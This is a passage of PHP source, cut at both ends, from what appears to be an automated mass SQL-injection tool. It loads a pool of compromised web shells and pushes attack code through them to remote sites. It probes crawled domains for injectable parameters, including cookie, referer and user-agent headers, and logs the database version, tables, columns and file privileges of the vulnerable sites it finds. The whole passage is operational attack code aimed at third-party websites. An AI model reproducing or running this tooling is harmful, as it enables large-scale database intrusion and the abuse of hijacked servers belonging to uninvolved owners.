							// tmp11
							$url_string = 'http://' . $ddd;
							// tmp22
							$url_struct = parse_url($url_string);
							$domen33 = $url_struct['host'];
						} else {
							$this->d('CURL ERROR: ' . curl_error($ch));
							$this->set_domen_status(
							1,
							'false',
							$url['domens']['host'],
							$url['domens']['id']
							);
						}
						
						if (empty($cont[0])
						||empty($cont[1])
						||empty($cont[2])
						) {
							$this->d($ku, 'Bad response: ' . curl_error($ch));
							$this->set_domen_status(
							1,
							'false',
							$url['domens']['host'],
							$url['domens']['id']
							);
						} else {

						if (
						!(strstr($cont[2], 'false'))
						&& (trim($cont[2]) !== '')
						&& (trim($cont[0]) !== '')
						&& (trim($cont[1]) !== '')
						) {
							$this->d('SQLI FOUND');
							$this->set_domen_status(
							2,
							$cont[2],
							$domen33,
							$url['domens']['id']
							);
						}


						if (
						strstr($cont[2], 'false')
						&& (trim($cont[0]) !== ''
						)
						) {
							$this->d('SQLI NOT FOUND');
							$this->set_domen_status(
							1,
							'false',
							$domen33,
							$url['domens']['id']
							);
						}
						}
						flush();
						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);
						unset($ch, $url, $ku, $domen33);

						if (0 < count($urls)) {
							$newservv = $serv;
							$kkk = count($newservv);
							$lll = mt_rand(1, $kkk-1);
							$urserv = $newservv[$lll];
							$urs_shell = $urserv;
							$this->d('zapusk dopolnitelno');
							$urs_one = array_shift($urls);
							$urs_shell = trim($urs_shell);
							if (!(empty($urs_shell))) {
								$urlllll = trim($urs_one['domens']['domen_new']);
								$urlllll = trim($urlllll);
								$urlllll = $urs_one['domens']['http'] . $urlllll;
								$this->d($urlllll, $urs_shell);

								if ($urlllll != '') {
									$ch = $this->create_streem($urs_shell, $urlllll, $this->time_crowler);
									$tasks[$urlllll . ':::' . $urs_one['domens']['id']] = $ch;
                          curl_multi_add_handle($cmh, $ch);
								}

							}

						}

					}


					
					$this->workup();
				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}

		}

		curl_multi_close($cmh);
		$this->stop('find_domen_sqli', $time_start);
		
		$this->d('end errorDOMENS');
		exit();
	}

	public function check_posts_all_to_post($id = '')
	{
		if ($id != '') {
			$file = $this->Post->query('SELECT * FROM `posts_all` WHERE `id`=' . $id . ' limit 1');
			$this->d('SELECT * FROM `posts_all` WHERE `id`=' . $id . ' limit 1');
		}
		 else {
			$file = $this->Post->query('SELECT * FROM `posts_all` WHERE `status` =3 AND `insert_post` =0 limit 10');
		}

		$this->d($file, '$file check_posts_all_to_post id ' . $id);

		foreach ($file as $val ) {
			$id = $val['posts_all']['id'];
			$url = $val['posts_all']['url'];
			$gurl = $val['posts_all']['gurl'];
			$sposob = $val['posts_all']['sposob'];
			$domen = $val['posts_all']['domen'];
			$path_query = $val['posts_all']['path_query'];
			$http = $val['posts_all']['http'];
			$sleep = $val['posts_all']['sleep'];
			$find = $val['posts_all']['find'];
			$status = $val['posts_all']['status'];
			$tables = $val['posts_all']['tables'];
			$work = $val['posts_all']['work'];
			$prohod = $val['posts_all']['prohod'];
			$method = $val['posts_all']['method'];
			$column = $val['posts_all']['column'];
			$mysqlbd = $val['posts_all']['mysqlbd'];
			$file_priv = $val['posts_all']['file_priv'];
			$from = $val['posts_all']['from'];
			$version = $val['posts_all']['version'];
			$tic = $val['posts_all']['tic'];
			$date = date('Y-m-d h:i:s');
			$tic = 0;
			$maska = $this->get_arg_url($url);
			$crawler = 1;

			if ($this->Post->query('INSERT INTO `posts` (`domen`,`url`,`gurl`,`http`,`path_query`,`find`,`status`,`maska`,`crawler`,`date`,`tic`,`tables`,`prohod`,`method`,`column`,`mysqlbd`,`file_priv`,`version`,`work`,`sposob`,`from` ) VALUES(\'' . $domen . '\',\'' . $url . '\',\'' . $gurl . '\',\'' . $http . '\',\'' . $path_query . '\',\'' . $find . '\',' . $status . ',\'' . $maska . '\',1,\'' . $date . '\',\'' . $tic . '\',\'' . $tables . '\',\'' . $prohod . '\',\'' . $method . '\',\'' . $column . '\',\'' . $mysqlbd . '\',\'' . $file_priv . '\',\'' . $version . '\',\'' . $work . '\',' . $sposob . ',\'' . $from . '\'  )')) {
				$this->d('insert good iz posts_all v posts check_posts_all_to_post');
				$this->d('UPDATE  `posts_all`  set `insert_post` = 1 WHERE `domen` like \'%' . $domen . '%\' or `url` like \'%' . $domen . '%');
				$this->Post->query('UPDATE  `posts_all`  set `insert_post` = 1 WHERE `domen` like \'%' . $domen . '%\' or `url` like \'%' . $domen . '%\'');
			}
			 else {
				$this->d('INSERT INTO `posts` (`domen`,`url`,`gurl`,`http`,`path_query`,`find`,`status`,`maska`,`crawler`,`date`,`tic`,`tables`,`prohod`,`method`,`column`,`mysqlbd`,`file_priv`,`version`,`work`,`sposob`,`from` ) VALUES(\'' . $domen . '\',\'' . $url . '\',\'' . $gurl . '\',\'' . $http . '\',\'' . $path_query . '\',\'' . $find . '\',' . $status . ',\'' . $maska . '\',1,\'' . $date . '\',\'' . $tic . '\',\'' . $tables . '\',\'' . $prohod . '\',\'' . $method . '\',\'' . $column . '\',\'' . $mysqlbd . '\',\'' . $file_priv . '\',\'' . $version . '\',\'' . $work . '\',' . $sposob . ',\'' . $from . '\')');
				echo '<br>';
				$this->d('vozmojno uje est v bd');
				$this->d('BAD !!! !!!!!!!!!!!! iz posts_all v posts check_posts_all_to_post');
			}

			flush();
		}
	}

	public function black_site()
	{
		$black = file('black_site.txt');

		foreach ($black as $bl ) {
			$bl = str_replace('http://', '', $bl);
			$bl = str_replace('www.', '', $bl);
			$bl = trim($bl);

			if (3 < strlen($bl)) {
				if ($this->Post->query('DELETE FROM posts WHERE domen like \'%' . $bl . '%\'')) {
				    $this->d('delete success ' . $bl);
				}

			}

		}
	}

	private function error_finder($all = false) {

	    $posts_name_table = 'posts';
	    $step_name = 'stepOne';
	    $urls_error_limit = $this->error_limit;
	    if($all) {
            $posts_name_table = 'posts_all';
            $step_name = 'stepOne_all';
            $urls_error_limit = $this->error_limit_all;
        }

        $this->black_site();

        $file = $this->Post->query(
            'SELECT count(*) FROM `'
            . $posts_name_table
            . '` WHERE `status`=0  AND header=\'get\''
        );
        $start = $this->Post->query('SELECT * FROM  `starts` WHERE function="psn" ');

        if (0 < count($start)) {
            exit('Уже запущено PSN');
        }


        $this->d('count(*) ' . $file[0][0]['count(*)']);

        if (intval($file[0][0]['count(*)']) !== 0) {
            $this->timeStart = $this->start($step_name, 1);
        } else {
            exit('TimeStart');
        }

        if (!$all) {
            $urls_multi = $this->Post->query(
                'SELECT count(*) FROM `'
                . $posts_name_table
                . '` WHERE `status`=2 AND `prohod`<5 '
                . 'AND (find !=\'cookies\' AND find !=\'referer\'  AND find !=\'useragent\'  and find !=\'forwarder\')'
            );

            if (200 < intval($urls_multi[0][0]['count(*)'])) {

                $this->stop();
                exit('TimeStartMULTI > 500');
            }
        }

        $this->Post->query('DELETE FROM `' . $posts_name_table . '` WHERE `domen` like \'www.%\'');

        $this->Post->query(
            'UPDATE  `'
            . $posts_name_table
            . '`  set `url` =  REPLACE(url,\'http://http://\',\'http://\')'
        );

        $this->proxyCheck();

        if ($this->sqlmap_check == true) {
            $file = $this->Post->query(
                'SELECT `url`,`id`,`http`,`header` FROM `'
                . $posts_name_table .
                '` WHERE `status`=0 AND `sqlmap_check`=0 '
                . ($all?' GROUP BY `domen` ':'')
                . ' limit ' . $urls_error_limit
            );
        } else {
            $file = $this->Post->query(
                'SELECT `url`,`id`,`http`,`header` FROM `'
                . $posts_name_table .
                '` WHERE `status`=0 '
                . ($all?' GROUP BY `domen` ':'')
                .  ' limit ' . $urls_error_limit
            );
        }

        if ($all && (count($file) < 5)) {
            $file = $this->Post->query('SELECT `url`,`id`,`http`,`header` FROM `posts_all` WHERE `status`=0  limit ' . $urls_error_limit);
        }

        $this->d($file, 'file');
        $this->evaltest();

        foreach ($file as $val ) {
            $urls[] = $val[$posts_name_table]['url'] . '++'
                . $val[$posts_name_table]['http'] . '++'
                . $val[$posts_name_table]['header'] . '++'
                . $val[$posts_name_table]['id'];
        }

		$this->set_code($this->build_shell_code('sql.php'));
		
        $cmh = curl_multi_init();
        $tasks = array();
        $count_serv = count($this->serv);
        $count_urls = count($urls);
        $this->d($count_serv, 'count_serv_kolichetvo!!');
        $this->d($count_urls, '$count_urls');
        $i = 0;

        while ($i < $count_urls) {
            $this->workup();
            echo $i . ' - i<br>';
            if (($i == $count_serv) || (count($urls) == 0)) {
                $this->d($i, 'count->break');
                break;
            }


            $urserv = $this->serv[$i];

            if ($urserv == '') {
                break;
            }


            $ch = $this->create_streem($urserv, array_shift($urls), $this->error_time);
            $this->d($ch);
            $tasks[$urserv] = $ch;
            curl_multi_add_handle($cmh, $ch);
            ++$i;
        }

        $active = null;

        do {
            $mrc = curl_multi_exec($cmh, $active);
        } while ($mrc == CURLM_CALL_MULTI_PERFORM);

        while ($mrc == CURLM_OK && $active) {
            if (curl_multi_select($cmh) != -1) {
                do {
                    $mrc = curl_multi_exec($cmh, $active);
                    $info = curl_multi_info_read($cmh);
                    // visit fix 03.10.18
                    if ($info['msg'] == CURLMSG_DONE) {
                        $ch = $info['handle'];

                        $tasks_url = array_search($ch, $tasks);
                        $tasks[$tasks_url] = curl_multi_getcontent($ch);
                        $cont = explode(':::', $tasks[$tasks_url]);
                        $cont[1] = trim($cont[1]);
                        $id_new = trim($cont[2]);
                        
                        if ($this->check_bad_response($tasks[$tasks_url])) {
                            $this->write_blackshell($tasks_url);
             	           $this->d('Internal Server Error');
							curl_multi_remove_handle($cmh, $ch);
                 	       curl_close($ch);
                            continue;
                        }
                        
                        $kk = $this->replace_url_schema_tab_trim($cont[0]);
                        $kk = 'http://' . $kk;
                        $tmp = parse_url($kk);
                        $domen = mysql_real_escape_string($tmp['host']);
                        $domen = str_replace('www.www.www.', '', $domen);
                        $domen = str_replace('www.www.', '', $domen);
                        $domen = str_replace('www.', '', $domen);
                        $tt = str_replace('www.', '', $domen);
                        $domen2 = 'www.' . $tt;
                        $date = date('Y-m-d h:i:s');

                        if (
                            !(strstr($cont[1], 'false'))
                            && (trim($cont[1]) !== '')
                            && (trim($cont[0]) !== '')
                        ) {
                            $id = $this->Post->query(
                                'SELECT `id` FROM `'
                                . $posts_name_table
                                . '` WHERE `id` = ' . $id_new
                            );

                            if (count($id) == 1) {
                                if (!(strstr($cont[1], '%'))) {
                                    $this->d($cont[0], 'url found SQLI OK!!!!');
                                    $this->Post->query(
                                        'UPDATE `'
                                        . $posts_name_table .
                                        '` SET `find`=\'' . $cont[1]
                                        . '\',`status`=2,`date`=\'' . $date
                                        . '\',`tic`=\'' . $this->getcy('http://' . $tmp['host'])
                                        . '\' WHERE `id`=' . $id[0][$posts_name_table]['id']
                                    );
                                }

                            }
                            else {
                                $this->d('SELECT `id` FROM ' . $posts_name_table . ' WHERE `id` = ' . $id_new);
                                $this->d($cont[0], 'SQLI OK! id  NOT found!!  ' . $cont[1]);
                            }
                        }


                        if (strstr($cont[1], 'false') && (trim($cont[0]) !== '')) {
                            $id = $this->Post->query(
                                'SELECT `id` FROM `'
                                . $posts_name_table
                                . '` WHERE `id` = ' . $id_new
                            );

                            if (count($id) == 1) {
                                if ($this->Post->query(
                                    'UPDATE `'
                                    . $posts_name_table
                                    . '` SET `status`=1,`date`=\'' . $date
                                    . '\' WHERE `id` =' . $id[0][$posts_name_table]['id'])
                                ) {
                                    $this->d('FALSE UPDATE TRUE');
                                }

                            }
                            else {
                                $this->d('count[1] = false AND $cont[0] !=""');
                                $this->d('SELECT `id` FROM ' . $posts_name_table . ' WHERE `id` = ' . $id_new);
                                $this->d($cont[0], 'HUEVO  FALSE id NOT found!!');
                            }
                        }


                        flush();
                        curl_multi_remove_handle($cmh, $ch);
                        curl_close($ch);

                        if (0 < count($urls)) {
                            echo 'zapusk dopolnitelno<br>';
                            $kkk = count($this->serv);
                            $lll = mt_rand(1, $kkk);
                            $urserv = $this->serv[$lll];
                            $ch = $this->create_streem($urserv, array_shift($urls), $this->error_time);
                            $tasks[$urserv] = $ch;
                            curl_multi_add_handle($cmh, $ch);
                        }

                    }
                    $this->workup();
                } while ($mrc == CURLM_CALL_MULTI_PERFORM);
            }

        }

        curl_multi_close($cmh);
        $this->stop();
        $this->d('end error_find [all: ' . $all . ']');
        exit();
    }

	public function errorFinder($test = '')
	{
		$this->error_finder();
	}

	public function errorFinder_all($test = '')
	{
        $this->error_finder(true);
	}
	
	public function write_blackshell($shell_url) {
		if (!$this->local_shells) {
			if (trim($shell_url) != '') {
				$filename = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/blackshell.txt';
				$fh = fopen($filename, 'a+');
				fwrite($fh, trim($shell_url) . "\r\n");
				fclose($fh);
			}
		}
	}

	public function check_bad_response($content) {
		return 
			(strstr($content, 'Internal Server Error')
				|| strstr($content, '405 Not Allowed')
				|| strstr($content, '502 Bad Gateway') 
				|| strstr($content, '500 Internal Server Error') 
				|| strstr($content, 'TURKHACKTEAM')
				|| strstr($content, 'Während der Anfrage')
				|| strstr($content, 'Unauthorized')
                || strstr($content, 'Malformed header from CGI script')
                || strstr($content, 'Server Error')
                || strstr($content, 'Access is denied')
			);
	}
	
	public function multi_base($all = false)
	{
		$posts_table = 'posts';
		$current_task = 'stepTwo';
		if ($all) {
			$posts_table = 'posts_all';
			$current_task = 'stepTwo_all';
		}
			
		$file = $this->Post->query(
			'SELECT count(*) '
			. 'FROM `' . $posts_table . '` '
			. 'WHERE `status`=0'
		);
		$r = rand(1, 100);
		$this->Post->query(
			'UPDATE  `' . $posts_table . '` '
		  	. 'SET `url` =  REPLACE(url,\'"\',\'\')'
		);
		$this->timeStart = $this->start($current_task, 1);
		// Using ternary operator!
		$urls = $this->Post->query(
			'SELECT * FROM `' . $posts_table . '` ' 
			. ' WHERE `status`=2 AND `prohod`<5 AND '
			. ' (find !=\'cookies\' AND find !=\'referer\'  AND '
			. ' find !=\'useragent\'  and find !=\'forwarder\') '
			. ($all ? ' GROUP by `domen` ' : '')
			. ' limit ' . $this->multi_limit
		);

		if (count($urls) == 0) {
			$this->stop();
			$this->d( 'multi_base(all:' . $all . ')::urls empty');
			exit();
		}


		$this->proxyCheck();
		$this->evaltest();
		$this->d('multi_base(all:' . $all . ')::shells_loaded');
		flush();
		$serv = $this->serv;
		$this->set_code($this->build_shell_code('code.php'));
		
		$cmh = curl_multi_init();
		$tasks = array();
		$count_serv = count($serv);
		$count_urls = count($urls);
		$this->d($count_serv, 'count_serv_kolichetvo!!');
		$this->d($count_urls, '$count_urls');
		$newservv = $serv;
		$i = 0;

		while ($i < $count_urls) {
			$this->workup();
			if (($i == $count_serv) || (count($urls) == 0)) {
				$this->d($i, 'count->break');
				break;
			}


			flush();
			$kkk = count($newservv);
			$lll = mt_rand(1, $kkk);
			$urserv = $newservv[$lll];
			$urs_shell = $urserv;
			$urs_one = array_shift($urls);
			$urs_shell = trim($urs_shell);

			if (!(empty($urs_shell))) {
				$urlllll = trim($urs_one[$posts_table]['url']);
				
				$ch = $this->create_streem(
					$urs_shell,
					$urlllll . '::'
			 			. $urs_one[$posts_table]['http'] . '::' 
						 . $urs_one[$posts_table]['header'],
					$this->multi_time
				);
				
				$tasks_index = 
					$urs_shell . ':::'
						. $urs_one[$posts_table]['url'] . ':::' 
						. $urs_one[$posts_table]['id'];
						
				$tasks[$tasks_index] = $ch;
				curl_multi_add_handle($cmh, $ch);
			}
			++$i;
		}

		$this->d(count($tasks), '$tasks count');
		$active = null;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

		while ($mrc == CURLM_OK && $active) {
			if (curl_multi_select($cmh) != -1) {
				do {
					$this->workup();
					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$tasks_url = array_search($ch, $tasks);
						$tasks[$tasks_url] = curl_multi_getcontent($ch);
						$content = $tasks[$tasks_url];
						
						$url = explode(':::', $tasks_url);
						$shell_url = $url[0];
						$url[$posts_table]['id'] = $url[2];
						$url[$posts_table]['url'] = $url[1];
						
						if ($this->check_bad_response($content)) {
							$this->write_blackshell($shell_url);

							$this->d(
                 			   "Internal Server Error OTVET\n"
									. $tasks_url
                  		  );
							curl_multi_remove_handle($cmh, $ch);
							curl_close($ch);
							continue;
						}
						if ($this->debug == true) {
							$this->d(
								$content,
								'multi_base(all:' . $all . ')::content'
							);
						}

						$id_new = $url[2];
						$id_new = str_replace(':', '', $id_new);
						$id_new = trim($id_new);
						$url2 = $url[1];
						$url[$posts_table]['url'] = $this->replace_url_schema_tab_trim($url[$posts_table]['url']);
						$urltic = parse_url('http://' . $url[$posts_table]['url']);
						$domen = $urltic['host'];
						$domen = str_replace('www.www.www.', '', $domen);
						$domen = str_replace('www.www.', '', $domen);
						$domen = str_replace('www.', '', $domen);
						$domen2 = 'www.' . $domen;
						$date = date('Y-m-d h:i:s');
						flush();

						if (strstr($content, 'falze')) {
							$exp = explode('::', $content);
							$ggg = 'FALZE';
							$this->d('multi_base(all:' . $all . ')::FALZE::' . $url2);
						}
						 else {
							$this->d('multi_base(all:' . $all . ')::OK::' . $url2);
							preg_match_all(
								'/<(.*?)>(.*?)<\/(.*?)>/',
								$content,
								$arr
							);
							if (isset($arr[2][1])) {
								$file_priv = 0;
								$mysqlbd = 0;
								if ((@$arr[2][7] == 'Y') || (@$arr[2][7] == 'y')) {
									$mysqlbd = 1;
									$file_priv = 1;
								}


								if ((@$arr[2][7] == 'N') || (@$arr[2][7] == 'n')) {
									$mysqlbd = 1;
									$file_priv = 0;
								}


								flush();
								$arr[2][6] = substr($arr[2][6], 0, 30);

								if (preg_match('/,/', $arr[2][8])) {
									$zap = true;
								}
								 else {
									if (($arr[2][8] == '') || ($arr[2][8] == 0)) {
										$zap = true;
									}

								}

								$lll = strlen($arr[2][8]);

								if (
									!(empty($arr[2][3]))
									&& ($urltic['host'] != '')
									&& ($arr[2][6] != '')
									&& !(empty($urltic['host']))
									&& ($arr[2][8] != 'Gateway time-out')
									&& ($lll < 55)
									&& ($arr[2][8] != 'An error has occurred while processing your request.')
									&& ($zap == true)
									&& ($arr[2][8] != 'Während der Anfrage ist ein Fehler aufgetreten!')
									&& !(preg_match('/Internal Server Error/i', $arr[0][1]))
									&& !(preg_match('/405 Not Allowed/i', $arr[0][1]))
									&& !(preg_match('/Server Error/i', $arr[0][1]))
									&& !(preg_match('/Time-out/i', $arr[0][1]))
									&& !(preg_match('/error/i', $arr[0][1]))
								) {
									$arr[2][6] = str_replace(array('\'', '"'), '', $arr[2][6]);
									$arr[2][8] = str_replace(array('\'', '"'), '', $arr[2][8]);
									$arr[2][1] = str_replace('post::', '', $arr[2][1]);
									$arr[2][1] = str_replace('get::', '', $arr[2][1]);
									
									$query_str = 'UPDATE `' . $posts_table .'` SET ' . "\r\n\t\t\t\t\t\t\t\t\t" . '`prohod` = 5,' . "\r\n\t\t\t\t\t\t\t\t\t" . '`url`="' . $arr[2][1] . '",' . "\r\n\t\t\t\t\t\t\t\t\t" . '`gurl`="' . $arr[2][1] . '",' . "\r\n\t\t\t\t\t\t\t\t\t" . '`tables`="' . mysql_real_escape_string($arr[2][8]) . '",' . "\r\n\t\t\t\t\t\t\t\t\t" . '`status`=3,' . "\r\n\t\t\t\t\t\t\t\t\t" . '`work`="' . $arr[2][6] . '",' . "\r\n\t\t\t\t\t\t\t\t\t" . '`sposob`="' . mysql_real_escape_string($arr[2][5]) . '",' . "\r\n\t\t\t\t\t\t\t\t\t" . '`method`="' . mysql_real_escape_string($arr[2][2]) . '",' . "\r\n\t\t\t\t\t\t\t\t\t" . '`column`="' . $arr[2][4] . '",' . "\r\n\t\t\t\t\t\t\t\t\t" . '`mysqlbd`="' . $mysqlbd . '",' . "\r\n\t\t\t\t\t\t\t\t\t" . '`file_priv`="' . $file_priv . '",' . "\r\n\t\t\t\t\t\t\t\t\t" . '`version`="' . mysql_real_escape_string($arr[2][3]) . '",' . "\r\n\t\t\t\t\t\t\t\t\t" . '`tic`=' . $this->getcy($urltic['host']) . ',' . "\r\n\t\t\t\t\t\t\t\t\t" . '`sleep` ="' . mysql_real_escape_string($arr[2][9]) . '"' . "\r\n\t\t\t\t\t\t\t\t\t" . 'WHERE `id` =' . $id_new;
									if ($this->Post->query($query_str)) {
										if ($all) {
											$this->check_posts_all_to_post($id_new);
										}
										$this->d($domen, 'update TRUE');
									}
									 else {
										$this->d($domen, 'update FALSE !');
										$this->d($query_str);
									}
								}

							}
							 else {
								$this->d($arr, 'arr_all _ PUSTO');
								$this->d($url[$posts_table]['url'] . ':::PUSTO', $url2);
							}
						}

					$query_str = 'UPDATE  `' . $posts_table .'` SET  `prohod` = 5,`multi_count`=multi_count+1,`date`="' . $date . '" WHERE  `id` =' . $id_new;
					  if ($this->Post->query($query_str)) {
							$this->d('good prohod update');
						}
						 else {
							$this->d('FALSE prohod update');
							$this->d($query_str);
						}

						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);

						if (0 < count($urls)) {
							$this->d('multi_base(all:' . $all . ')::run_additional_task');
							$kkk = count($newservv);
							$lll = mt_rand(1, $kkk-1);
							$urserv = $newservv[$lll];
							$urs_shell = $urserv;
							$urs_one = array_shift($urls);

							if (!(empty($urs_shell))) {
								$urlllll = str_replace('http://', '', trim($urs_one[$posts_table]['url']));
								$ch = $this->create_streem($urs_shell, $urlllll . '::' . $urs_one[$posts_table]['http'] . '::' . $urs_one[$posts_table]['header'], $this->multi_time);
								$tasks[$urs_shell . ':::' . $urs_one[$posts_table]['url'] . ':::' . $urs_one[$posts_table]['id']] = $ch;
								curl_multi_add_handle($cmh, $ch);
							}

						}

					}

				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}

		}

		curl_multi_close($cmh);
		$this->stop();
		exit();
	}

	public function multi($test = '')
	{
		$this->multi_base();
	}

	public function multi_all($test = '')
	{
		$this->multi_base(true);
	}

	public function headFinder($test = '')
	{
		if ($this->head_check == false) {
			return;
		}


		$this->black_site();
		$file = $this->Post->query('SELECT count(*) as count FROM `posts` WHERE `status`=1');

		if (intval($file[0][0]['count']) !== 0) {
			$this->timeStart = $this->start('stepOneHead', 1);
		}
		 else {
			exit('TimeStartHead');
		}

		$this->Post->query('DELETE FROM `posts` WHERE `domen` like \'www.%\'');
		$r = rand(1, 100);
		$this->Post->query('UPDATE  `posts`  set `url` =  REPLACE(url,\'http://http://\',\'http://\')');
		$file = $this->Post->query('SELECT * FROM `posts` WHERE `status`=1 limit 100');
		$this->evaltest();

		foreach ($file as $val ) {
			$urls[] = $val['posts']['url'] . '++' . $val['posts']['http'];
		}

		$this->set_code($this->build_shell_code('sql_head.php'));

		$cmh = curl_multi_init();
		$tasks = array();
		$count_serv = count($this->serv);
		$count_urls = count($urls);
		$i = 0;
		$this->d($count_serv, 'count_serv_kolichetvo!!');
		$this->d($count_urls, '$count_urls');
		$i = 0;

		while ($i < $count_urls) {
			$this->workup();
			echo $i . ' - i<br>';
			if (($i == $count_serv) || (count($urls) == 0)) {
				$this->d($i, 'count->break');
				break;
			}


			$urserv = $this->serv[$i];

			if ($urserv == '') {
				break;
			}


			$ch = $this->create_streem($urserv, array_shift($urls), 40);
			$this->d($ch);
			$tasks[$urserv] = $ch;
			curl_multi_add_handle($cmh, $ch);
			++$i;
		}

		$active = NULL;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

		while ($mrc == CURLM_OK) {
			if (curl_multi_select($cmh) != -1) {
				do {
					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$this->d($ch, 'ch');
						$url = array_search($ch, $tasks);
						$tasks[$url] = curl_multi_getcontent($ch);
						$cont = explode(':::', $tasks[$url]);
						$cont[1] = trim($cont[1]);
						$cont[0] = str_replace('http://http://', 'http://', trim($cont[0]));
						$cont[0] = str_replace('http://' . "\t" . 'http://', 'http://', trim($cont[0]));
						$cont[0] = str_replace('http://http://', 'http://', trim($cont[0]));
						$cont[0] = str_replace('http://http:// ', 'http://', trim($cont[0]));
						$cont[0] = str_replace('http://', '', trim($cont[0]));
						$kk = $cont[0];
						$kk = 'http://' . $kk;
						$tmp = parse_url($kk);
						$domen = mysql_real_escape_string($tmp['host']);
						$domen = str_replace('www.www.www.', '', $domen);
						$domen = str_replace('www.www.', '', $domen);
						$domen = str_replace('www.', '', $domen);
						$tt = str_replace('www.', '', $domen);
						$domen2 = 'www.' . $tt;

						if (!(strstr($cont[1], 'false')) && (trim($cont[1]) !== '') && (trim($cont[0]) !== '')) {
							$id = $this->Post->query('SELECT `id` FROM `posts` WHERE `domen` = \'' . $domen . '\' or `domen` = \'' . $domen2 . '\'');
							$this->d('SELECT `id` FROM posts WHERE `domen` = \'' . $domen . '\' or `domen` = \'' . $domen2 . '\'');

							if (count($id) == 1) {
								if (!(strstr($cont[1], '%'))) {
									$this->d($cont[0], 'url found SQLI OK!!!!');
									$this->Post->query('UPDATE `posts` SET `find`=\'' . $cont[1] . '\',`status`=2,`tic`=\'' . $this->getcy('http://' . $tmp['host']) . '\' WHERE `id`=' . $id[0]['posts']['id']);
								}

							}
							 else {
								$this->d($cont[0], 'SQLI OK! id  NOT found!!  ' . $cont[1]);
							}
						}


						if (strstr($cont[1], 'false') && (trim($cont[0]) !== '')) {
							$this->d('count[1] = false AND $cont[0] !=""');
							$id = $this->Post->query('SELECT `id` FROM `posts` WHERE  `domen` = \'' . $domen . '\' or `domen` =\'' . $domen2 . '\'');
							$this->d('SELECT `id` FROM `posts` WHERE  `domen` = \'' . $domen . '\' or `domen` = \'' . $domen2 . '\'');

							if (count($id) == 1) {
								$this->Post->query('UPDATE `posts` SET `status`=11 WHERE `id` =' . $id[0]['posts']['id']);
							}
							 else {
								$this->d($cont[0], 'HUEVO  FALSE id NOT found!!');
							}
						}


						flush();
						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);

						if (0 < count($urls)) {
							echo 'zapusk dopolnitelno<br>';
							$kkk = count($this->serv);
							$lll = mt_rand(1, $kkk);
							$urserv = $this->serv[$lll];
							$ch = $this->create_streem($urserv, array_shift($urls));
							$tasks[$urserv] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}

					}


					$this->workup();
				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}

		}

		curl_multi_close($cmh);

		if (count($file) < 10) {
		}


		$this->stop();
		exit('end errorfind');
	}

	public function headMulti($test = '')
	{
		uses('xml');
		$r = rand(1, 100);
		$this->Post->query('UPDATE  `posts`  set `url` =  REPLACE(url,\'"\',\'\')');
		$this->timeStart = $this->start('stepTwoHead', 1);
		$urls = $this->Post->query('SELECT * FROM `posts` WHERE `status`=2 AND `prohod` <5 AND (find =\'cookies\' or find =\'referer\' or find =\'post\' or find =\'useragent\'  or find =\'forwarder\') limit 5');
		$this->d($urls, '$urls');

		if (count($urls) == 0) {
			$this->stop();
			echo 'Нету ссылок';
			exit();
		}


		$this->evaltest();
		echo '<h1>Загрузили шеллы</h1>';
		flush();
		$serv = $this->serv;
		$this->set_code($this->build_shell_code('code_head.php'));

		$cmh = curl_multi_init();
		$tasks = array();
		$count_serv = count($serv);
		$count_urls = count($urls);
		$i = 0;
		$this->d($count_serv, 'count_serv_kolichetvo!!');
		$this->d($count_urls, '$count_urls');
		$newservv = $serv;
		$i = 0;

		while ($i < $count_urls) {
			$this->workup();
			if (($i == $count_serv) || (count($urls) == 0)) {
				$this->d($i, 'count->break');
				break;
			}


			flush();
			$urs_shell = array_shift($newservv);
			$urs_shell = trim($urs_shell);
			$urs_one = array_shift($urls);

			if (!(empty($urs_shell))) {
				$urlllll = trim($urs_one['posts']['url']);
				$urlllll = trim($urlllll);
				$inject = $urs_one['posts']['find'];
				$this->d($urs_shell, $urlllll . '::' . $urs_one['posts']['http'] . '::' . $inject);
				$ch = $this->create_streem($urs_shell, $urlllll . '::' . $urs_one['posts']['http'] . '::' . $inject, 150);
				$tasks[$urs_one['posts']['url'] . ':::' . $urs_one['posts']['id']] = $ch;
				curl_multi_add_handle($cmh, $ch);
			}


			++$i;
		}

		$this->d($tasks, '$tasks');
		$active = NULL;

		do {
			$mrc = curl_multi_exec($cmh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);

		while ($mrc == CURLM_OK) {
			if (curl_multi_select($cmh) != -1) {
				do {
					$this->workup();
					$mrc = curl_multi_exec($cmh, $active);
					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) {
						$ch = $info['handle'];
						$url = array_search($ch, $tasks);
						$tasks[$url] = curl_multi_getcontent($ch);
						$content = $tasks[$url];
						$url = explode(':::', $url);
						$shell_url = $url[0];
						$url['posts']['id'] = $url[1];
						$url['posts']['url'] = $url[0];
						$url2 = $url[0];
						$this->d($content, 'cont');
						$url['posts']['url'] = str_replace('http://http://', 'http://', trim($url['posts']['url']));
						$url['posts']['url'] = str_replace('http://' . "\t" . 'http://', 'http://', trim($url['posts']['url']));
						$url['posts']['url'] = str_replace('http://http://', 'http://', trim($url['posts']['url']));
						$url['posts']['url'] = str_replace('http://http:// ', 'http://', trim($url['posts']['url']));
						$url['posts']['url'] = str_replace('http://', '', trim($url['posts']['url']));
						$url['posts']['url'] = str_replace('http://', '', $url['posts']['url']);
						$url['posts']['url'] = str_replace('https://', '', $url['posts']['url']);
						$urltic = parse_url('http://' . $url['posts']['url']);
						$domen = $urltic['host'];
						$domen = str_replace('www.www.www.', '', $domen);
						$domen = str_replace('www.www.', '', $domen);
						$domen = str_replace('www.', '', $domen);
						$domen2 = 'www.' . $domen;
						flush();

